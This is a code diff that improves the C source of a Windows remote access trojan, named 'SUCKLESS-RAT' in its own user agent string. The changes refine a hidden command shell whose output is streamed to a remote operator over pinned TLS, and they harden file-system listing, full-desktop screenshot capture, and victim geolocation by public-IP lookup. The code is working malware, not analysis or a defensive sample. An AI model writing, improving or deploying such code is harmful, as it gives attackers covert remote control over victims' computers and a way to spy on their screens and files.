@@ -13,22 +13,31 @@ static const unsigned char kPin[32] = { 0x08,0x22,0x8D,0xA7,0x86,0x98,0x4D,0x60,
 static TlsCtx* g_tls = NULL;
 static volatile LONG g_run = 1;
 static volatile LONG g_bye = 0;
-static HANDLE g_hShellInW = NULL, g_hShellOutR = NULL, g_hShellProc = NULL;
+static HANDLE g_hShellInW = NULL, g_hShellProc = NULL, g_hShellThread = NULL;
 static CRITICAL_SECTION g_cs;
 static char g_country[64] = "?", g_pubip[64] = "?";
-static DWORD WINAPI ShellReader(LPVOID) {
-  char buf[4096]; DWORD n; HANDLE out = g_hShellOutR;
-  while (ReadFile(out, buf, sizeof(buf), &n, NULL)) {
-    if (n == 0) break;
+static DWORD WINAPI ShellReader(LPVOID p) {
+  HANDLE out = (HANDLE)p; char buf[4096]; DWORD n;
+  while (ReadFile(out, buf, sizeof(buf), &n, NULL) && n) {
     EnterCriticalSection(&g_cs); if (g_tls && g_run) TlsSendMsg(g_tls, C_SHELL_DATA, buf, n); LeaveCriticalSection(&g_cs);
   }
+  CloseHandle(out);
   EnterCriticalSection(&g_cs); if (g_tls && g_run) TlsSendMsg(g_tls, C_SHELL_CLOSE, NULL, 0); LeaveCriticalSection(&g_cs);
   return 0;
 }
+static void ShellStop() {
+  HANDLE proc = g_hShellProc, in = g_hShellInW, th = g_hShellThread;
+  g_hShellProc = g_hShellInW = g_hShellThread = NULL;
+  if (proc) { TerminateProcess(proc, 0); CloseHandle(proc); }
+  if (in) CloseHandle(in);
+  if (th) { WaitForSingleObject(th, 1000); CloseHandle(th); }
+}
 static void ShellStart() {
+  ShellStop();
   SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
   HANDLE inR, inW, outR, outW;
-  if (!CreatePipe(&inR, &inW, &sa, 0) || !CreatePipe(&outR, &outW, &sa, 0)) return;
+  if (!CreatePipe(&inR, &inW, &sa, 0)) return;
+  if (!CreatePipe(&outR, &outW, &sa, 0)) { CloseHandle(inR); CloseHandle(inW); return; }
   SetHandleInformation(inW, HANDLE_FLAG_INHERIT, 0);
   SetHandleInformation(outR, HANDLE_FLAG_INHERIT, 0);
   STARTUPINFOA si = { 0 }; si.cb = sizeof(si);
@@ -39,24 +48,19 @@ static void ShellStart() {
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
     CloseHandle(inR); CloseHandle(inW); CloseHandle(outR); CloseHandle(outW); return;
   }
-  g_hShellInW = inW; g_hShellOutR = outR; g_hShellProc = pi.hProcess;
+  g_hShellInW = inW; g_hShellProc = pi.hProcess;
   CloseHandle(inR); CloseHandle(outW); CloseHandle(pi.hThread);
-  CreateThread(NULL, 0, ShellReader, NULL, 0, NULL);
-}
-static void ShellStop() {
-  if (g_hShellProc) { TerminateProcess(g_hShellProc, 0); CloseHandle(g_hShellProc); g_hShellProc = NULL; }
-  if (g_hShellInW) { CloseHandle(g_hShellInW); g_hShellInW = NULL; }
-  if (g_hShellOutR) { CloseHandle(g_hShellOutR); g_hShellOutR = NULL; }
+  g_hShellThread = CreateThread(NULL, 0, ShellReader, outR, 0, NULL);
+  if (!g_hShellThread) CloseHandle(outR);
 }
 static char* FsList(const char* path, uint32_t* outLen) {
-  char glob[MAX_PATH * 2];
-  if (!path || path[0] == 0) strcpy(glob, "C:\\*");
-  else {
-    strcpy(glob, path);
-    size_t len = strlen(glob);
-    if (glob[len-1] != '\\' && glob[len-1] != '/') strcat(glob, "\\*");
-    else strcat(glob, "*");
+  char glob[MAX_PATH * 2]; int k = snprintf(glob, sizeof(glob), "%s", path && path[0] ? path : "C:\\");
+  if (k < 0 || (size_t)k >= sizeof(glob) - 2) {
+    char* e = (char*)malloc(32); if (!e) { *outLen = 0; return NULL; }
+    strcpy(e, "ERR|path too long\n"); *outLen = 18; return e;
   }
+  size_t len = strlen(glob);
+  if (glob[len-1] != '\\' && glob[len-1] != '/') strcat(glob, "\\*"); else strcat(glob, "*");
   WIN32_FIND_DATAA fd;
   HANDLE h = FindFirstFileA(glob, &fd);
   if (h == INVALID_HANDLE_VALUE) {
@@ -218,24 +222,31 @@ static char* SysInfo(uint32_t* outLen) {
   *outLen = (uint32_t)b.n; return b.p;
 }
 static char* Screenshot(uint32_t* outLen) {
+  *outLen = 0;
   int vw = GetSystemMetrics(SM_CXVIRTUALSCREEN), vh = GetSystemMetrics(SM_CYVIRTUALSCREEN);
   int vx = GetSystemMetrics(SM_XVIRTUALSCREEN), vy = GetSystemMetrics(SM_YVIRTUALSCREEN);
+  if (vw <= 0 || vh <= 0 || vw > 32767 || vh > 32767 || (int64_t)vw * vh > 100000000LL) return NULL;
   HDC scr = GetDC(NULL), mem = CreateCompatibleDC(scr);
-  HBITMAP bm = CreateCompatibleBitmap(scr, vw, vh);
-  SelectObject(mem, bm);
-  BitBlt(mem, 0, 0, vw, vh, scr, vx, vy, SRCCOPY | CAPTUREBLT);
-  BITMAPINFO bi = {0}; bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
-  bi.bmiHeader.biWidth = vw; bi.bmiHeader.biHeight = vh;
-  bi.bmiHeader.biPlanes = 1; bi.bmiHeader.biBitCount = 24; bi.bmiHeader.biCompression = BI_RGB;
-  int rowBytes = ((vw * 3 + 3) & ~3); DWORD px = (DWORD)rowBytes * vh;
-  BITMAPFILEHEADER fh = {0};
-  fh.bfType = 'B' | ('M' << 8); fh.bfOffBits = sizeof(fh) + sizeof(BITMAPINFOHEADER); fh.bfSize = fh.bfOffBits + px;
-  char* out = (char*)malloc(fh.bfSize);
-  if (out) {
-    memcpy(out, &fh, sizeof(fh)); memcpy(out + sizeof(fh), &bi.bmiHeader, sizeof(BITMAPINFOHEADER));
-    GetDIBits(mem, bm, 0, vh, out + fh.bfOffBits, &bi, DIB_RGB_COLORS); *outLen = fh.bfSize;
-  } else *outLen = 0;
-  DeleteObject(bm); DeleteDC(mem); ReleaseDC(NULL, scr); return out;
+  HBITMAP bm = (scr && mem) ? CreateCompatibleBitmap(scr, vw, vh) : NULL;
+  HGDIOBJ old = (mem && bm) ? SelectObject(mem, bm) : NULL;
+  char* out = NULL;
+  if (mem && bm && old && old != HGDI_ERROR && BitBlt(mem, 0, 0, vw, vh, scr, vx, vy, SRCCOPY | CAPTUREBLT)) {
+    BITMAPINFO bi = {0}; bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
+    bi.bmiHeader.biWidth = vw; bi.bmiHeader.biHeight = vh;
+    bi.bmiHeader.biPlanes = 1; bi.bmiHeader.biBitCount = 24; bi.bmiHeader.biCompression = BI_RGB;
+    int rowBytes = (vw * 3 + 3) & ~3; DWORD px = (DWORD)rowBytes * (DWORD)vh;
+    BITMAPFILEHEADER fh = {0};
+    fh.bfType = 'B' | ('M' << 8); fh.bfOffBits = sizeof(fh) + sizeof(BITMAPINFOHEADER); fh.bfSize = fh.bfOffBits + px;
+    out = (char*)malloc(fh.bfSize);
+    if (out) {
+      memcpy(out, &fh, sizeof(fh)); memcpy(out + sizeof(fh), &bi.bmiHeader, sizeof(BITMAPINFOHEADER));
+      if (GetDIBits(mem, bm, 0, vh, out + fh.bfOffBits, &bi, DIB_RGB_COLORS)) *outLen = fh.bfSize;
+      else { free(out); out = NULL; }
+    }
+  }
+  if (old && old != HGDI_ERROR) SelectObject(mem, old);
+  if (bm) DeleteObject(bm); if (mem) DeleteDC(mem); if (scr) ReleaseDC(NULL, scr);
+  return out;
 }
 static void FetchCountry() {
   HINTERNET h = InternetOpenA("SUCKLESS-RAT", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
@@ -244,15 +255,15 @@ static void FetchCountry() {
   InternetSetOptionA(h, INTERNET_OPTION_CONNECT_TIMEOUT, &t, sizeof(t));
   InternetSetOptionA(h, INTERNET_OPTION_SEND_TIMEOUT, &t, sizeof(t));
   InternetSetOptionA(h, INTERNET_OPTION_RECEIVE_TIMEOUT, &t, sizeof(t));
-  HINTERNET u = InternetOpenUrlA(h, "http://ip-api.com/line/?fields=country,query", NULL, 0,
-    INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_CACHE_WRITE, 0);
+  HINTERNET u = InternetOpenUrlA(h, "https://api.country.is/", NULL, 0,
+    INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE, 0);
   char buf[256] = {0}; DWORD r = 0, got = 0;
   if (u) { while (got < sizeof(buf) - 1 && InternetReadFile(u, buf + got, (DWORD)(sizeof(buf) - 1 - got), &r) && r) got += r; InternetCloseHandle(u); }
   InternetCloseHandle(h);
-  char* nl = strchr(buf, '\n'); if (!nl) return; *nl = 0;
-  char* ip = nl + 1; char* e = strchr(ip, '\n'); if (e) *e = 0; Trim(buf); Trim(ip);
-  if (buf[0] && strcmp(buf, "fail")) strncpy(g_country, buf, sizeof(g_country) - 1);
-  if (ip[0] && strcmp(ip, "fail")) strncpy(g_pubip, ip, sizeof(g_pubip) - 1);
+  char* c = strstr(buf, "\"country\":\"");
+  if (c) { c += 11; char* e = strchr(c, '"'); if (e) { *e = 0; snprintf(g_country, sizeof(g_country), "%s", c); } }
+  char* i = strstr(buf, "\"ip\":\"");
+  if (i) { i += 6; char* e = strchr(i, '"'); if (e) { *e = 0; snprintf(g_pubip, sizeof(g_pubip), "%s", i); } }
 }
 static DWORD WINAPI Worker(const char* addr) {
   char host[256] = {0}; int port = 8443;
